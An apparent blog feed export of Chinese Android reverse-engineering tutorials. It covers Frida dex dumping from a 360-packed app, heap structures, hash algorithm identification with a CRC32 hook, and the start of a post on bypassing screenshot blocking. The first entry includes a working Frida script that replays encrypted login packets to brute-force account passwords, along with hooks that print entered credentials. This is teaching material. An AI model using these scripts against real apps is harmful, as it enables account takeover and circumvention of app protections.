<li>根据<code>hooklibc()</code>调用<code>printNativeStack()</code>打印的结果来看，App使用的都是Java层的函数，并没有直接调用libc或者更深层的函数。</li>
<li>这样就不需要hook<code>libc</code>了，可以在脚本中删除这个函数了</li>
</ul>
<p>修改脚本后继续测试：输入账号密码，点击登陆</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710114838578.png" class="" title="image-20240710114838578">

<ul>
<li><p>可以看到发送的数据，看起来像是base64加密的</p>
</li>
<li><p>以及发包函数<code>a.a.a.a$a</code>以及收包函数<code>a.a.a.a$c</code>，这里的调试信息也没有抹去，可以定位到它的地址在214行</p>
</li>
<li><p>以及<code>java.lang.Thread.run</code>的地址在764行</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240708225424262.png" class="" title="image-20240708225424262"></li>
</ul>
<h3 id="用GDA分析apk"><a href="#用GDA分析apk" class="headerlink" title="用GDA分析apk"></a>用GDA分析apk</h3><img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240708225912459.png" class="" title="image-20240708225912459">

<ul>
<li>有360的壳</li>
</ul>
<p>那就先脱壳，在协议分析中很多时候都要先脱壳才能分析：这里脱壳要使用<code>getDex</code>所以刷了7.1.2</p>
<ul>
<li>这里我们直接使用fart自动化脱壳工具进行脱壳就行了，360的壳直接去dump就可以了，因为它只是<strong>onCreate</strong>函数的一个vmp保护</li>
</ul>
<h4 id="编写脚本dump-dex"><a href="#编写脚本dump-dex" class="headerlink" title="编写脚本dump dex"></a>编写脚本dump dex</h4><pre><code class="js">// 只适用于存在getDex和getBytes api 的Android版本-&gt;7.1.2以下
function dumpdex(){
    // com.example.socket.MainActivity
    // a.a.a.a$a    // 直接通过类名定位到需要的dex
    Java.perform(function(){
        var File = Java.use("java.io.File")
        var FileOutputStream = Java.use("java.io.FileOutputStream")
        // 首先，定位到类的class loader，通过它得到class对象
        Java.enumerateClassLoadersSync().forEach(function(loader){
            console.log(loader + "\n")
            try {
                var aclass = loader.loadClass("a.a.a.a$a")
                console.log(aclass)
                var dexobj = aclass.getDex()
                console.log(dexobj)
                var dexbytes = dexobj.getBytes()
                var dexsavepath = "/data/data/com.example.socket/dump.dex"
                var dexfile = File.$new(dexsavepath)
                if(!dexfile.exists()){
                    dexfile.createNewFile()
                }
                var fileoutputstream = FileOutputStream.$new(dexsavepath)
                fileoutputstream.write(dexbytes)
                fileoutputstream.flush()
                fileoutputstream.close()
                console.log("save dex success!")
            } catch (err) {
                
            }
        })
    })
}
</code></pre>
<ul>
<li>在Android7以下，可以通过<code>getDex</code>和<code>getBytes</code>来获取目标dex并dump下来的方式进行脱壳</li>
</ul>
<p>dump成功</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710093722998.png" class="" title="image-20240710093722998">

<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710093737986.png" class="" title="image-20240710093737986">

<ul>
<li>用GDA分析的时候提示文件打开失败</li>
<li>检查一下是不是文件头错误，用010Edit把文件头替换成正常的文件头</li>
</ul>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710093956219.png" class="" title="image-20240710093956219">

<ul>
<li>头没有了，八个字节全都是0</li>
<li>替换个正常的头过来</li>
</ul>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710115018651.png" class="" title="image-20240710115018651">

<ul>
<li>脱壳后就可以看到<code>run</code>函数</li>
</ul>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710115836703.png" class="" title="image-20240710115836703">

<ul>
<li>合并两个参数</li>
</ul>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710133533095.png" class="" title="image-20240710133533095">

<ul>
<li><p>hook <code>HelloKitty.hello</code>获取参数和返回值</p>
<pre><code class="js">function hookHelloKitty(){
    // com.example.socket.MainActivity
    // a.a.a.a$a    // 直接通过类名定位到需要的dex
    Java.perform(function(){
        var File = Java.use("java.io.File")
        var FileOutputStream = Java.use("java.io.FileOutputStream")
        // 首先，定位到类的class loader，通过它得到class对象
        Java.enumerateClassLoadersSync().forEach(function(loader){
            console.log(loader + "\n")
            try {
                var aclass = loader.loadClass("a.a.a.a$a")
                Java.classFactory.loader = loader
                var HelloKitty = Java.use("com.example.socket.HelloKitty")
                // hello
                HelloKitty.hello.implementation = function(arg0){
                    console.log("HelloKitty.hello is called! arg0: " + arg0)
                    var result = this.hello(arg0)
                    console.log("HelloKitty.hello called over! result: " + result)
                    return result
                }
            } catch (err) {
                
            }
        })
    })
}
</code></pre>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240713154548170.png" class="" title="image-20240713154548170">

<ul>
<li>通过hook直接打印出来了我们输入的账号密码</li>
</ul>
</li>
</ul>
<p>这些是hook <code>a.a.a.a$a</code>也就是<code>hello</code>得到的结果，是发送</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710140059967.png" class="" title="image-20240710140059967">

<ul>
<li>这里的<code>.c</code>是接收相关的函数</li>
</ul>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710201205089.png" class="" title="image-20240710201205089">

<p>查看<code>a.a(byte)</code></p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710201443067.png" class="" title="image-20240710201443067">

<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710201508180.png" class="" title="image-20240710201508180">

<ul>
<li><code>kitty</code>函数是一个native函数，暂时不管它</li>
</ul>
<p>那么我们这里继续hook <code>HelloKitty.kitty(str)</code>函数来拿到它的参数和返回值</p>
<pre><code class="js">                // kitty
                HelloKitty.kitty.implementation = function (arg0) {
                    console.log("HelloKitty.kitty is called! arg0: " + arg0)
                    var result = this.kitty(arg0)
                    console.log("HelloKitty.kitty called over! result: " + result)
                    return result
                }
</code></pre>
<p>hook结果</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710202241179.png" class="" title="image-20240710202241179">

<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710202450565.png" class="" title="image-20240710202450565">

<ul>
<li><p>可以拿到传入的参数</p>
</li>
<li><p><code>kitty</code>函数执行完之后解密的字符串</p>
</li>
<li><p>还有点击登录响应之后返回的结果-&gt;提示密码错误</p>
</li>
</ul>
<p>此时经过前面的hook我们基本可以知道：<code>hello()</code>是用来加密的，<code>kitty()</code>是用来解密的</p>
<p>这两个都是native函数，而这个360的壳没有对so进行加密，用IDA可以分析这个so</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710203135698.png" class="" title="image-20240710203135698">

<ul>
<li>ida里面可以直接搜索到这两个函数</li>
</ul>
<p>如果暴力破解的话</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240710204529936.png" class="" title="image-20240710204529936">

<p>我们需要去模拟框起来的流程，模拟它的流程给服务端发送指定格式的数据，然后根据返回的结果判断是否破解成功</p>
<pre><code class="js">function checkuser(username) {
  //com.example.socket.MainActivity
  //a.a.a.a$a
  /*   String crypt = HelloKitty.hello(this.f1a);
                      byte[] content = crypt.getBytes("utf-8");
                      MessageDigest m = MessageDigest.getInstance("MD5");
                      m.update(crypt.getBytes("UTF8"));
                      m.digest()
                      byte[] finalarray = a.a(content, m.digest());
                      if (a.e != null) {
                          a.e.write(finalarray);
                      }

*/
  Java.perform(function () {
    var File = Java.use('java.io.File');
    var FileOutputStream = Java.use('java.io.FileOutputStream');
    Java.enumerateClassLoadersSync().forEach(function (loader) {
      console.log(loader + "\n");
      try {
        loader.loadClass("a.a.a.a$a")
        Java.classFactory.loader = loader;
        var HelloKitty = Java.use('com.example.socket.HelloKitty');

        var crypt = HelloKitty.hello(username);
        console.log("hello result:" + crypt);
        /*byte[] content = "utf-8";
    content = crypt.getBytes(content);*/

        var StringClass = Java.use('java.lang.String');
        console.log(StringClass)
        var strobj = StringClass.$new(crypt);
        console.log(strobj)
        var cryptbytes = strobj.getBytes("utf-8");
        console.log(JSON.stringify(cryptbytes));
        /*  MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(crypt.getBytes("UTF8"));
            m.digest()*/
        var MessageDigest = Java.use('java.security.MessageDigest');
        var m = MessageDigest.getInstance("MD5");
        m.update(cryptbytes);
        var md5hash = m.digest();
        console.log("hash:" + JSON.stringify(md5hash));
        //byte[] finalarray = a.a(content, m.digest());
        //                         if (a.e != null) {
        //                             a.e.write(finalarray);
        //                         }

        var aClass = Java.use('a.a.a.a');
        console.log(aClass)
        var sendbytes = aClass.a(cryptbytes, md5hash);
        console.log("sendbytes:" + JSON.stringify(sendbytes));
        var outputstream = aClass._e.value;
        console.log(outputstream);
        outputstream.write(sendbytes);
        outputstream.flush();
        console.log("send success");
      } catch (e) {
      }
    })
  })
}
function main() {
  checkuser('{"msgtype":"login","loginname":"100","loginpwd":"qaz"}')
}

setImmediate(main);
</code></pre>
<ul>
<li>只要循环去生成0~100的账号和三个字母的密码，循环就可以了</li>
<li>这种暴力破解只需要不停的传递参数模拟调用就可以了，不涉及对它native层的加解密的分析</li>
</ul>
<p>未完待续。。。</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>堆结构</title>
    <url>/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="堆结构"><a href="#堆结构" class="headerlink" title="堆结构"></a>堆结构</h1><h4 id="堆与栈的区别："><a href="#堆与栈的区别：" class="headerlink" title="堆与栈的区别："></a>堆与栈的区别：</h4><hr>
<ol>
<li>栈空间是在程序设计时已经规定好怎么使用，使用多少内存空间的。</li>
<li>堆是一种在程序运行时动态分配的内存。</li>
<li>堆是需要程序员自己通过malloc、new等函数自己申请的，根据程序的运行环境和申请的大小也有可能申请失败。</li>
<li>一般我们通过一个堆指针来使用所申请到的堆内存，进行读、写、释放等操作。</li>
<li>使用完成后需要把堆指针传给释放函数（free、delete）来回收这片内存，否则会造成内存泄漏。</li>
</ol>
<h4 id="堆的数据结构与管理策略"><a href="#堆的数据结构与管理策略" class="headerlink" title="堆的数据结构与管理策略"></a>堆的数据结构与管理策略</h4><span id="more"></span>

<hr>
<ul>
<li><p>堆块：堆区的内存按大小不同组织成堆块，以堆块为单位进行标识。一个堆块包括两个部分：块首和块身。块首是一个堆块头部的几个字节，用来标识这个堆块自身的信息，例如：大小、是否空闲；块身紧跟在块首后面，是分配给用户使用的数据区。</p>
</li>
<li><p><strong>堆管理系统所返回的指针一般指向块身的起始位置</strong></p>
</li>
<li><p>堆表：堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。现代操作系统的堆表往往不止一种数据结构。</p>
<img src="/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/image-20200920172506034.png" class="" title="image-20200920172506034"></li>
</ul>
<center> 堆的内存组织 </center>

<ul>
<li>在Windows中，占用态的堆块被使用他的程序索引，而堆表只索引所有空闲态的堆块。其中，最重要的堆表有两种：空闲双向链表Freelist（简称 空表），和快速单向链表Lookaside（简称 快表）。</li>
</ul>
<h5 id="1-空表"><a href="#1-空表" class="headerlink" title="1. 空表"></a>1. 空表</h5><p>​	空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分成128条。</p>
<p>​	堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引。该数组的每一项包括两个指针，用于标识一条空表。</p>
<p>​	空表索引的第二项（free[1])标识了堆中所有大小为8字节的空闲堆块，之后每个索引项递增8个字节，<em><em>空闲堆块的大小 = 索引项（ID）</em> 8（字节）</em>*</p>
<p>​	把空闲堆块按照大小链入不同的空表，可以方便堆管理系统高校检索指定大小的空闲堆块。空表索引的第一项比较特殊，这条双向链表链入了所有大于等于1024字节的堆块（小于512KB）。这些堆块按照大小依次排列。</p>
<img src="/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/image-20200920214021750.png" class="" title="image-20200920214021750">

<center>空闲双向链表（Freelist）</center>

<h4 id="2-快表"><a href="#2-快表" class="headerlink" title="2. 快表"></a>2. 快表</h4><p>​	快表是Windows为了加速堆块分配而采用的一种堆表。这类单向链表从来不会发生堆块合并（其中的空闲块块首被设置为占用态，用来防止对快合并）。</p>
<p>​	快表也有128条，组织结构与空表类似，只是其中的对快按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个节点，故很快就会被填满。</p>
<p>​	堆中的操作可以分为堆块分配、堆块释放和堆块合并三种。其中“分配”和“释放”是在程序中提交申请和执行的，而堆块合并则是由堆块管理系统自动完成的。</p>
<p>​	<img src="/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/image-20200920220236046.png" class="" title="image-20200920220236046"></p>
<center>快速单向链表(Lookaside)</center>

]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>堆</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学中的HASH算法</title>
    <url>/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>HASH，一般翻译做散列、杂凑，或音译为哈希，是把任意长度的输入（又叫做预映射pre-image）通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。</p>
<span id="more"></span>

<h4 id="HASH算法的应用"><a href="#HASH算法的应用" class="headerlink" title="HASH算法的应用"></a>HASH算法的应用</h4><p>HASH算法在当前被广泛的应用在信息传输中的错误校验、信息安全等领域，比如简单地对函数的前几个字节进行crc32校验用于inline hook的检测、签名验证等</p>
<p>常用的hash算法：</p>
<blockquote>
<p>CRC家族如CRC16、CRC32等</p>
<p>MD4的改进版MD5，更安全，在抗分析和差分方面表现更好</p>
<p>SHA-1、SHA-256等，抗穷举（brute-force）性更好</p>
</blockquote>
<h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h4><p>MD5、SHA1的破解</p>
<p>2004年8月17日，在美国加州圣芭芭拉召开的国际密码大会上，山东大学的王小云教授首次宣布了她以及她的研究小组的研究成果——对MD5、HAVAL-128、MD4和RIPEMD四个著名密码算法的破译结果。次年二月宣布破解SHA-1密码。</p>
<p>一些研究表明SHA-256在特定的情况下也存在碰撞的可能性</p>
<h4 id="HASH算法之CRC32"><a href="#HASH算法之CRC32" class="headerlink" title="HASH算法之CRC32"></a>HASH算法之CRC32</h4><p>CRC检验原理实际上就是在一个p位二进制数据序列之后附加一个r位二进制检验码（序列），从而构成一个总长为$n = p ➕r$位的二进制序列；附加在数据序列之后的这个检验码与数据序列的内容之间存在着某种特定的关系。如果因干扰等原因使数据序列中的某一位或某些位发生错误，这种特定关系就会被破坏。因此，通过检查这一关系，就可以实现对数据正确性的检验。</p>
<blockquote>
<p>优点：检错能力极强，开销小，易于用编码器及检测电路实现。从其检错能力来看，它所不能发现的错误的几率仅为*0.0047%*以下。从性能上和开销上考虑，均远远优于奇偶校验及算数和校验等方式</p>
<h6 id="CRC的本质"><a href="#CRC的本质" class="headerlink" title="CRC的本质"></a>CRC的本质</h6><p>是模-2除法的余数，采用的除数不同，CRC的类型也就不一样。通常，CRC的除数用生成多项式来表示。最常用的CRC码及生成多项式名称有CRC-12、CRC-16、CRC-32，对应的输出即hash value分别为12位、16位和32位</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240305185912278-17096363541791.png" class="" title="image-20240305185912278">
</blockquote>
<h5 id="在Java中使用和hook-CRC32"><a href="#在Java中使用和hook-CRC32" class="headerlink" title="在Java中使用和hook CRC32"></a>在Java中使用和hook CRC32</h5><p>Java类：Java.util.zip.CRC32</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240306101811436.png" class="" title="image-20240306101811436">

<ul>
<li><p>Java本身提供了这个类，直接引入包名调用即可</p>
</li>
<li><p>hook的时候跟之前一样对*update()<em>和</em>getValue()*进行hook就可以了</p>
<pre><code class="js">function hookCRC32(){
    if(Java.available){
        Java.perform(function(){
            var CRC32 = Java.use('java.util.zip.CRC32');
            CRC32.update.overload('[B').implementation = function(bytes){
                console.log('CRC32-&gt;update: ' + JSON.stringify(bytes));
                var StringClass = Java.use('java.lang.String');
                var str = StringClass.$new(bytes);
                console.log('CRC32-&gt;update str: ' + str);
                var result = this.update(bytes);
                return result;
            }
            CRC32.getValue.implementation = function(){
                var result = this.getValue();
                console.log('CRC32-&gt;getValue: ' + result);
                return result;
            }
            })
    }
}
setImmediate(hookCRC32);
</code></pre>
<ul>
<li><p>这里以皮皮虾为例测试一下</p>
<p><code>frida -U -f com.sup.android.superb -l hash.js --no-pause</code></p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309215008271.png" class="" title="image-20240309215008271"></li>
</ul>
</li>
</ul>
<h5 id="在so中识别CRC32"><a href="#在so中识别CRC32" class="headerlink" title="在so中识别CRC32"></a>在so中识别CRC32</h5><p>为了提高CRC32的计算效率，往往使用查表法，因此就引入了常量表。该查询表可以使用静态的数据，也可以动态生成，因此只需要使用FindCrypt自动识别即可（下图为FindCrypy中的yara规则）；同时CRC32的输出长度与输入数据无关，始终为32位。</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309215641454.png" class="" title="image-20240309215641454">

<h6 id="例如，我们拿编写的没有加混淆的demo-app来反编译看一下"><a href="#例如，我们拿编写的没有加混淆的demo-app来反编译看一下" class="headerlink" title="例如，我们拿编写的没有加混淆的demo app来反编译看一下"></a>例如，我们拿编写的没有加混淆的demo app来反编译看一下</h6><blockquote>
<p>直接<strong>ctrl + alt + F</strong>使用findcrypt插件定位到常量表</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309221546115.png" class="" title="image-20240309221546115">

<p>进入常量位置，用交叉引用定位到调用常量位置</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309221701706.png" class="" title="image-20240309221701706">

<p>接下来这里IDA直接识别出来算法代码了</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309221910700.png" class="" title="image-20240309221910700">
</blockquote>
<h6 id="拿ollvm混淆过的看一下"><a href="#拿ollvm混淆过的看一下" class="headerlink" title="拿ollvm混淆过的看一下"></a>拿ollvm混淆过的看一下</h6><blockquote>
<p>依然可以定位</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309222034819.png" class="" title="image-20240309222034819">

<p>交叉引用</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309222331075.png" class="" title="image-20240309222331075">

<p>跟进去之后看一下它混淆后的流程</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309222525429.png" class="" title="image-20240309222525429">

<ul>
<li>还不是特别复杂</li>
</ul>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309222656577.png" class="" title="image-20240309222656577">

<ul>
<li>在这个位置F5很难看出来它具体有什么功能，当然需要的话也可以hook这个函数</li>
</ul>
<p>这个函数继续往上交叉引用</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309222924765.png" class="" title="image-20240309222924765">

<ul>
<li>进来之后就看到直接定位到JNI函数当中了，有三个参数<strong>a3</strong>就是我们输入的内容，<strong>a1</strong>还是JNIENV*</li>
</ul>
<p>改完之后看一下，这里面是使用哪个函数来处理我们输入的参数的</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309224009458.png" class="" title="image-20240309224009458">

<ul>
<li>看到这个函数接受了我们的参数，有一个返回值暂时将它改为返回的指针</li>
<li>继续分析对这个指针接下来的两处处理</li>
</ul>
<p>第一处是一个赋值操作暂时先不管它，看第二处计算了它的长度</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309224205301.png" class="" title="image-20240309224205301">

<ul>
<li>这里分析起来还是比较难看出来什么</li>
<li>还是写frida脚本重放hook</li>
</ul>
<h6 id="另一种思路"><a href="#另一种思路" class="headerlink" title="另一种思路"></a>另一种思路</h6><p>因为，使用插件找到有调用CRC32常量的地方，所以可以猜测这里面一定是有调用CRC32的函数，所以往上找就能直接找到它的JNI函数</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309225440704.png" class="" title="image-20240309225440704">

<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240309225630338.png" class="" title="image-20240309225630338">

<ul>
<li><p>可以看到这里JNI函数的混淆还是比刚才的要复杂的</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240310101323491.png" class="" title="image-20240310101323491">

<ul>
<li>同样也定位到了这个位置，接下来还是编写frida脚本去重放就可以了</li>
</ul>
</li>
</ul>
</blockquote>
<h4 id="HASH算法之MD5"><a href="#HASH算法之MD5" class="headerlink" title="HASH算法之MD5"></a>HASH算法之MD5</h4><p>MD5的输出长度是128位，与输入内容无关。也存在一些常量，同样可以使用FindCrypt插件去识别。</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240310102337698.png" class="" title="image-20240310102337698">

<h4 id="SHA"><a href="#SHA" class="headerlink" title="SHA"></a>SHA</h4><p>在SHA家族中的SHA1、SHA256、SHA512中，也均有对应的不相同的常量表输出长度分别为160、256、512。这些都是算法的明显特征，这些算法也都有常量表都可以通过插件识别。在识别到之后通过frida编写脚本去查看函数的输入和输出，从而去分析。</p>
<img src="/2024/03/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84HASH%E7%AE%97%E6%B3%95/image-20240310102851853.png" class="" title="image-20240310102851853">

<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ol>
<li>针对Java层中的常见加解密算法的快速识别和逆向分析，可以重点对Cipher类相关的函数进行hook；</li>
<li>针对so中的常见加解密算法的快速逆向可以着手从常量表的识别、输入输出特征、控制流特征等结合；其中，动态的重放是一个极为快速高效的办法。</li>
</ol>
<h6 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h6><p><a href="https://github.com/xiaoeeyu/java-hash_hook/tree/main">示例代码</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>算法分析</tag>
        <tag>HASH</tag>
      </tags>
  </entry>
  <entry>
    <title>妹子图防截屏破解</title>
    <url>/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<p>本章主要是一个简单的hook，破解防截屏机制</p>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>没啥反抓包措施，直接使用charle抓包就行</p>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728103303669.png" class="" title="image-20240728103303669">

<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728102750717.png" class="" title="image-20240728102750717">



<hr>
<h3 id="FRIDA破解防截屏"><a href="#FRIDA破解防截屏" class="headerlink" title="FRIDA破解防截屏"></a>FRIDA破解防截屏</h3><img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728104415531.png" class="" title="image-20240728104415531">

<ul>
<li>妹纸图无法直接截屏</li>
</ul>
<p>查找一下Android中禁止截屏的实现方式</p>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240727211104991.png" class="" title="image-20240727211104991">

<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240727215259748.png" class="" title="image-20240727215259748">

<p>使用objection搜索一下<code>addFlags</code>或者<code>setFlags</code></p>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240727211820907.png" class="" title="image-20240727211820907">

<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240727212058515.png" class="" title="image-20240727212058515">

<ul>
<li>pixel 5的性能还不错能直接搜索到</li>
</ul>
<p>使用<a href="https://github.com/r0ysue/r0tracer">r0tracer</a>搜索一下<code>android.view.Window</code>类的调用记录</p>
